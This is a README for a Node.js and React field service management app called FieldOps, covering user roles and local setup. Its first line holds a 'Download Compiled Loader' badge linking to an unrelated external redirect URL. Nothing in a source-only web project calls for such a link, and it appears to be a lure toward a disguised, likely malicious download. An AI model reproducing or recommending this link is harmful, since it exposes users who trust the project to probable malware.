# FieldOps - Field Service Management Platform

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

## Project Overview
FieldOps is a web-based Field Service Management system built using Node.js, Express, MongoDB, and React.js. It is designed to help businesses manage their field service operations easily. The platform connects Admins, Technicians, and Clients in a single place. It allows businesses to track jobs, assign tasks to technicians, and gives clients the ability to see the progress of their service requests.

## Key Technologies
- **Frontend**: React.js (with modern, custom CSS design)
- **Backend**: Node.js, Express.js
- **Database**: MongoDB 

## User Roles & Use Cases

### 1. Admin
The Admin acts as the manager of the platform.
**Use Cases:**
- **Dashboard Overview**: Can easily view KPI metrics like Total Jobs, Pending Jobs, In-Progress Jobs, and Completed Jobs.
- **Manage Users**: Can view and manage both Technicians and Clients in the system.
- **Create Jobs**: Can easily create new service jobs or requests.
- **Assign Jobs**: Can assign available technicians to specific jobs.

### 2. Technician
The Technician is the person who goes to the field to do the actual work.
**Use Cases:**
- **View Assigned Jobs**: Can log in and see a list of jobs that the Admin has assigned specifically to them.
- **Update Job Status**: Can change the workflow status of their jobs (for example, updating a job from 'Pending' to 'In Progress' or 'Completed') as they make progress.

### 3. Client
The Client is the customer who has requested the service.
**Use Cases:**
- **Track Job Status**: Can securely log in to the system to track the real-time status and details of their own requested jobs. 

## How to Run the Project Locally

### 1. Backend Setup
1. Open a terminal and navigate to the `backend` folder: `cd backend`
2. Install the required packages: `npm install`
3. Create a `.env` file in the backend folder and add your `MONGO_URI` (MongoDB connection string) and `JWT_SECRET` (for secure login).
4. Run the server: `npm run dev`
*(The backend will run on http://localhost:5000)*

### 2. Frontend Setup
1. Open a new terminal and navigate to the `frontend` folder: `cd frontend`
2. Install the required packages: `npm install`
3. Start the application: `npm run dev`
*(The frontend will run on http://localhost:5173)*
